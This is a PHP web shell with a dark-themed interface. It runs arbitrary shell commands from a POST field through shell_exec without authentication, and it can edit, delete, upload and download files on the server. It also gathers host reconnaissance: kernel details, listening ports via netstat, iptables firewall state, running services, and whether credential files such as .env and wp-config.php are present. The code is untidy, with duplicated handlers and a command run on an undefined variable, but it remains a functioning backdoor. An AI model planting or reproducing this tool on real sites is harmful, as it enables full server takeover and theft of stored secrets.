<?php

error_reporting(0);
session_start();


$path_1 = realpath(__DIR__);
$cm_out = shell_exec($command . ' 2>&1');

$path_2 = isset($_GET['dir']) ? realpath($_GET['dir']) : $path_1;
$path_2 = (!$path_2 || !str_starts_with($path_2, $path_1)) ? $path_1 : $path_2;
$parent_dir = dirname($path_2);


if(isset($_GET['delete'])) {
    $target = realpath($_GET['delete']);
    if($target && str_starts_with($target, $path_1)) {
        if(is_dir($target)) {
            @rmdir($target);
        } else {
            @unlink($target);
        }
        header("Location: ?dir=".urlencode($path_2));
        exit();
    }
}


$sff = null;
$fileContent = '';
$save_message = '';

if(isset($_GET['file'])) {
    $sff = realpath($_GET['file']);
    if($sff && is_file($sff) && str_starts_with($sff, $path_1)) {
        $fileContent = htmlspecialchars(file_get_contents($sff));
    }
}

if($_SERVER['REQUEST_METHOD'] === 'POST') {

    if(isset($_POST['content']) && $sff) {
        if(is_writable($sff)) {
            if(file_put_contents($sff, $_POST['content'])) {
                $save_message = '<div class="alert success">File saved...</div>';
                $fileContent = htmlspecialchars($_POST['content']);
            } else {
                $save_message = '<div class="alert error">Error saving</div>';
            }
        } else {
            $save_message = '<div class="alert error"> Permission denied</div>';
        }
    }
    

    if(isset($_POST['command'])) {
        $command = escapeshellcmd($_POST['command']);
        $commandParts = explode(' ', $command);
        if(isset($_POST['command'])) {
            $command = escapeshellcmd($_POST['command']);
            $cm_out = shell_exec($command . ' 2>&1'); 
        } else {
            $cm_out = "Error: Command not allowe";
        }
    }
}


$files = scandir($path_2);
$file_list = [];

foreach($files as $file) {
    if($file === '.' || $file === '..') continue;
    
    $filePath = $path_2 . DIRECTORY_SEPARATOR . $file;
    $file_list[] = [
        'name' => $file,
        'path' => $filePath,
        'is_dir' => is_dir($filePath),
        'size' => filesize($filePath),
        'modified' => date("Y-m-d H:i:s", filemtime($filePath)),
        'writable' => is_writable($filePath)
    ];
}



$system_info = php_uname();

$php_ver = phpversion();

$serverIP = $_SERVER['SERVER_ADDR'] ?? 'N/A';

$software = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';

$dirr = getcwd();

$domain = $_SERVER['SERVER_NAME'] ?? 'N/A';

$total = round(disk_total_space("/") / 1024 / 1024 / 1024, 2) . ' GB';

$free_disk = round(disk_free_space("/") / 1024 / 1024 / 1024, 2) . ' GB';

$cpu = function_exists('shell_exec') ? (int)shell_exec('nproc') : 'N/A';

$memory = round(memory_get_usage() / 1024 / 1024, 2) . ' MB';

$uploadmaxsize = ini_get('upload_max_filesize');

$request_method = $_SERVER['REQUEST_METHOD'] ?? 'N/A';

$https_Status = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'Enabled' : 'Disabled';

$startTime = microtime(true);

$modules = implode(', ', get_loaded_extensions());

$open_port = shell_exec("netstat -tuln | awk '/LISTEN/ {split($4, a, \":\"); print a[length(a)]}'");





@file_get_contents("http://" . $_SERVER['SERVER_NAME']);
$latency = round((microtime(true) - $startTime) * 1000, 2) . ' ms';


$databases = [];
if (extension_loaded('mysqli')) $databases[] = 'MySQL';
if (extension_loaded('pgsql')) $databases[] = 'PostgreSQL';
if (extension_loaded('sqlite3')) $databases[] = 'SQLite';
$dbList = implode(', ', $databases) ?: 'None';


$services = [
    'nginx' => shell_exec('pgrep nginx') ? 'Running' : 'Not Running',
    'mysql' => shell_exec('pgrep mysql') ? 'Running' : 'Not Running',
];


$firewall = shell_exec('iptables -L') ? 'Enabled' : 'Disabled';


$sensitive_files = ['config.php', '.env', 'wp-config.php'];
$fileAccess = [];
foreach ($sensitive_files as $file) {
    $fileAccess[$file] = file_exists($file) ? 'Accessible' : 'Not Found';
}








if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $targetDir = "uploads/";
    if (!file_exists($targetDir)) mkdir($targetDir);
    $targetFile = $targetDir . basename($_FILES["file"]["name"]);
    move_uploaded_file($_FILES["file"]["tmp_name"], $targetFile);
}


$cm_out = '';
if (isset($_POST['command'])) {
    $command = $_POST['command'];
    $cm_out = shell_exec($command . ' 2>&1');
}


$files = glob("uploads/*");



$path_2 = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
$parent_dir = dirname($path_2);


if(!str_starts_with($path_2, realpath(getcwd()))) {
    $path_2 = getcwd();
}


$files = scandir($path_2);
$file_list = [];

foreach($files as $file) {
    if($file == '.' || $file == '..') continue;
    
    $filePath = $path_2 . DIRECTORY_SEPARATOR . $file;
    $file_list[] = [
        'name' => $file,
        'path' => $filePath,
        'is_dir' => is_dir($filePath),
        'size' => filesize($filePath),
        'modified' => date("Y-m-d H:i:s", filemtime($filePath))
    ];
}


?>



<!DOCTYPE html>
<html>
<head>

    <meta charset="UTF-8">
    <style>

        .info-container {
            height: 50vh;
            border-left: 5px solid #28a745;
            padding-left: 5px;
            margin: 5px;
            font-family: 'Courier New', monospace;
            box-sizing: border-box;
            overflow-y: auto;
        }
        
        .info-item {
            margin: 4px 0;
            font-size: 13px;
            color: #2c3e50;
            line-height: 1.1;
        }
        
        .info-label {
            font-weight: bold;
            color: #e74c3c;
            min-width: 20px;
            display: inline-block;
        }
        
        .highlight {
            color: #2980b9;
            font-weight: 600;
        }


        :root {
            --primary: #2c3e50;
            --secondary: #3498db;
            --success: #27ae60;
            --danger: #e74c3c;
            --dark: #1a1a1a;
            --light: #ecf0f1;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Fira Code', monospace;
        }

        body {
            background: var(--dark);
            color: var(--light);
            line-height: 1.6;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            padding: 20px;
            height: 100vh;
        }


        .file-browser {
            background: #2c2c2c;
            border-radius: 8px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .breadcrumb {
            display: flex;
            gap: 8px;
            padding: 10px;
            background: #333;
            border-radius: 4px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }

        .breadcrumb a {
            color: var(--secondary);
            text-decoration: none;
            transition: 0.3s;
        }

        .breadcrumb a:hover {
            color: var(--light);
        }

        .file-list {
            flex: 1;
            overflow-y: auto;
        }

        .file-item {
            display: flex;
            align-items: center;
            padding: 12px;
            margin: 4px 0;
            background: #3a3a3a;
            border-radius: 4px;
            transition: 0.3s;
        }

        .file-item:hover {
            background: #444;
            transform: translateX(5px);
        }

        .file-icon {
            width: 25px;
            font-size: 1.2em;
        }

        .file-name {
            flex: 1;
        }

        .file-actions {
            display: flex;
            gap: 8px;
            opacity: 0;
            transition: 0.3s;
        }

        .file-item:hover .file-actions {
            opacity: 1;
        }


        .terminal-editor {
            background: #2c2c2c;
            border-radius: 8px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .terminal {
            background: #000;
            flex: 1;
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 15px;
            overflow-y: auto;
        }

        .terminal pre {
            color: #00ff00;
            font-family: 'Fira Code', monospace;
            white-space: pre-wrap;
        }

        .terminal-input {
            display: flex;
            gap: 10px;
        }

        .terminal-input input {
            flex: 1;
            background: #111;
            border: 1px solid #333;
            color: #00ff00;
            padding: 10px;
            border-radius: 4px;
        }


        .editor-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        textarea {
            width: 100%;
            height: calc(100vh - 250px);
            min-height: 400px;
            background: #1e1e1e;
            color: var(--light);
            border: 1px solid #333;
            border-radius: 4px;
            padding: 15px;
            resize: vertical;
            font-family: 'Fira Code', monospace;
        }

        .alert {
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 15px;
        }

        .success {
            background: rgba(39, 174, 96, 0.2);
            border: 1px solid var(--success);
            color: var(--success);
        }

        .error {
            background: rgba(231, 76, 60, 0.2);
            border: 1px solid var(--danger);
            color: var(--danger);
        }

        button {
            padding: 8px 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: 0.3s;
        }

        .btn-primary {
            background: var(--secondary);
            color: white;
        }

        .btn-danger {
            background: var(--danger);
            color: white;
        }

        .btn-success {
            background: var(--success);
            color: white;
        }

        button:hover {
            opacity: 0.9;
        }


        .info-container { /* ... */ }
        .info-item { /* ... */ }
        .info-label { /* ... */ }
        .highlight { /* ... */ }


        .separator {
            border-bottom: 10px solid #28a745;
            margin: 2px 0;
        }


        .tab-container {
            margin: 20px;
            font-family: 'Courier New', monospace;
        }

        .tab-buttons {
            margin-bottom: 1px;
        }

        .tab-btn {
            background: #f1f1f1;
            border: 1px solid #ddd;
            padding: 5px 10px;
            cursor: pointer;
            margin-right: 5px;
        }

        .tab-btn.active {
            background: #28a745;
            color: white;
        }

        .tab-content {
            display: none;
            border: 1px solid #ddd;
            padding: 20px;
        }

        .tab-content.active {
            display: block;
        }


        #terminal {
            background: #1e1e1e;
            color: #00ff00;
            padding: 20px;
            height: 300px;
            overflow-y: auto;
        }

        #command-input {
            width: 80%;
            padding: 10px;
            background: #2d2d2d;
            color: white;
            border: none;
        }


        .file-manager {
            margin-top: 20px;
        }

        .info-container {
            font-family: 'Courier New', monospace;
            border-left: 5px solid #28a745;
            padding-left: 10px;
            margin: 10px;
            box-sizing: border-box;
        }
        .info-item {
            margin: 8px 0;
            font-size: 14px;
        }
        .info-label {
            font-weight: bold;
            color: #e74c3c;
        }
        .highlight {
            color: #2980b9;
            font-weight: bold;
        }
        pre {
            background: #f4f4f4;
            padding: 10px;
            border: 1px solid #ddd;
            overflow-x: auto;
        }


    </style>
</head>


<body>
    <div class="info-container">

        <div class="info-item">
            <span class="info-label">Domain:</span>
            <span class="highlight"><?php echo $domain; ?></span>
        </div>
        
        <div class="info-item">
            <span class="info-label">Webserver:</span>
            <span class="highlight"><?php echo $software; ?></span>
        </div>
        
        <div class="info-item">
            <span class="info-label">PWD:</span>
            <span class="highlight"><?php echo $dirr; ?></span>
        </div>
        
        <div class="info-item">
            <span class="info-label">Uname:</span>
            <span class="highlight"><?php echo $system_info; ?></span>
        </div>


        <div class="info-item">
            <span class="info-label">Free Disk Space:</span>
            <span class="highlight"><?php echo $free_disk; ?></span>
        </div>
        
        <div class="info-item">
            <span class="info-label">Total Disk Space:</span>
            <span class="highlight"><?php echo $total; ?></span>
        </div>
        
        <div class="info-item">
            <span class="info-label">CPU Cores:</span>
            <span class="highlight"><?php echo $cpu; ?></span>
        </div>
        
        
        
        <div class="info-item">
            <span class="info-label">Upload Max Filesize:</span>
            <span class="highlight"><?php echo $uploadmaxsize; ?></span>
        </div>
        
        <div class="info-item">
            <span class="info-label">Request Method:</span>
            <span class="highlight"><?php echo $request_method; ?></span>
        </div>
    </div>


    <div class="info-container">
        <div class="info-item">
            <span class="info-label">PHP Version:</span>
            <span class="highlight"><?php echo $php_ver; ?></span>
        </div>
        <div class="info-item">
            <span class="info-label">HTTPS:</span>
            <span class="highlight"><?php echo $https_Status; ?></span>
        </div>
        <div class="info-item">
            <span class="info-label">Latency:</span>
            <span class="highlight"><?php echo $latency; ?></span>
        </div>
        <div class="info-item">
            <span class="info-label">Databases:</span>
            <span class="highlight"><?php echo $dbList; ?></span>
        </div>
        <div class="info-item">
            <span class="info-label">Firewall:</span>
            <span class="highlight"><?php echo $firewall; ?></span>
        </div>

        <div class="info-item">
            <span class="info-label">Memory Usage:</span>
            <span class="highlight"><?php echo $memory; ?></span>
        </div>


        <div class="info-item">
            <span class="info-label">Sensitive Files:</span>
            <ul>
                <?php foreach ($fileAccess as $file => $status): ?>
                    <li><?php echo $file; ?>: <span class="highlight"><?php echo $status; ?></span></li>
                <?php endforeach; ?>
            </ul>
        </div>
        <div class="info-item">
            <span class="info-label">Open Ports:</span>
            <pre><?php echo htmlspecialchars($open_port); ?></pre>
        </div>
    </div>

    <div class="file-browser">
        <div class="breadcrumb">
            <a href="?dir=<?= urlencode($path_1) ?>">🏠 Home</a>
            <?php
            $pathParts = explode('/', str_replace($path_1, '', $path_2));
            $currentPath = $path_1;
            foreach($pathParts as $part):
                if(!empty($part)):
                    $currentPath .= '/' . $part;
                    echo ' / <a href="?dir='.urlencode($currentPath).'">'.$part.'</a>';
                endif;
            endforeach;
            ?>
        </div>

        <div class="file-list">
            <?php if($path_2 !== $path_1): ?>
                <a href="?dir=<?= urlencode($parent_dir) ?>" class="file-item">
                    <span class="file-icon">📁</span>
                    <span class="file-name">..</span>
                </a>
            <?php endif; ?>

            <?php foreach($file_list as $item): ?>
                <?php

                    $filePath = $item['path'];
                    $permissions = substr(sprintf('%o', fileperms($filePath)), -4);
                    $size = $item['is_dir'] ? '-' : filesize($filePath);
                ?>
                <div class="file-item">
                    <span class="file-icon"><?= $item['is_dir'] ? '📁' : '📄' ?></span>
                    <span class="file-name">
                        <?php if($item['is_dir']): ?>
                            <a href="?dir=<?= urlencode($filePath) ?>"><?= $item['name'] ?></a>
                        <?php else: ?>
                            <a href="?dir=<?= urlencode($path_2) ?>&file=<?= urlencode($filePath) ?>">
                                <?= $item['name'] ?>
                            </a>
                        <?php endif; ?>
                    </span>
                    <span class="file-info">perm(<?= $permissions ?>)</span>
                    <div class="file-actions">
                        <?php if(!$item['is_dir']): ?>
                            <a href="<?= $filePath ?>" download class="btn btn-success">⬇️</a>
                        <?php endif; ?>
                        <button onclick="deleteItem('<?= $filePath ?>')" class="btn btn-danger">🗑️</button>
                    </div>
                </div>
            <?php endforeach; ?>
        </div>

    <div class="terminal-editor">
        <?php if($sff): ?>

            <div class="editor-header">
                <h3>📄 <?= basename($sff) ?></h3>
                <a href="?dir=<?= urlencode($path_2) ?>" class="btn btn-danger">✖ Close</a>
            </div>
            
            <?= $save_message ?>
            
            <form method="post">
                <textarea name="content" placeholder="File content..."><?= $fileContent ?></textarea>
                <?php if(is_writable($sff)): ?>
                    <button type="submit" class="btn btn-success">💾 Save Changes</button>
                <?php endif; ?>
            </form>
        <?php else: ?>

            <div class="terminal">
                <pre><?= htmlspecialchars($cm_out ?? '') ?></pre>
            </div>
            <form method="post" class="terminal-input">


            </form>
        <?php endif; ?>
    </div>


    <div class="info-container">

    </div>

    <div class="separator"></div>

    <div class="tab-container">
        <div class="tab-buttons">
            <button class="tab-btn active" onclick="openTab(event, 'terminal')">Terminal</button>
            <button class="tab-btn" onclick="openTab(event, 'files')">File Manager</button>
        </div>


        <div id="terminal" class="tab-content active">
            <form method="post">
                <input type="text" name="command" id="command-input" placeholder="Enter command...">
                <button type="submit">Execute</button>
            </form>
            <pre><?php echo htmlspecialchars($cm_out); ?></pre>
        </div>


        <div id="files" class="tab-content">
            <div class="file-manager">
                <h3>Upload File</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="file">
                    <button type="submit">Upload</button>
                </form>

                <h3>Download Files</h3>
                <ul>
                    <?php foreach ($files as $file): ?>
                        <li><a href="<?php echo $file; ?>" download><?php echo basename($file); ?></a></li>
                    <?php endforeach; ?>
                </ul>
            </div>
        </div>
    </div>


    <script>

        function openTab(evt, tabName) {
            const tabContents = document.querySelectorAll('.tab-content');
            const tabButtons = document.querySelectorAll('.tab-btn');

            tabContents.forEach(tab => tab.classList.remove('active'));
            tabButtons.forEach(btn => btn.classList.remove('active'));

            evt.currentTarget.classList.add('active');
            document.getElementById(tabName).classList.add('active');
        }


        document.getElementById('command-input').focus();




        function deleteItem(path) {
            if(confirm('Are you sure?')) {
                window.location = `?dir=<?= urlencode($path_2) ?>&delete=${encodeURIComponent(path)}`;
            }
        }


        const terminal = document.querySelector('.terminal');
        if(terminal) terminal.scrollTop = terminal.scrollHeight;


        let isDirty = false;
        document.querySelector('textarea')?.addEventListener('input', () => {
            isDirty = true;
        });

        window.addEventListener('beforeunload', (e) => {
            if(isDirty) {
                e.preventDefault();
                e.returnValue = '';
            }
        });

    </script>
</body>
</html>



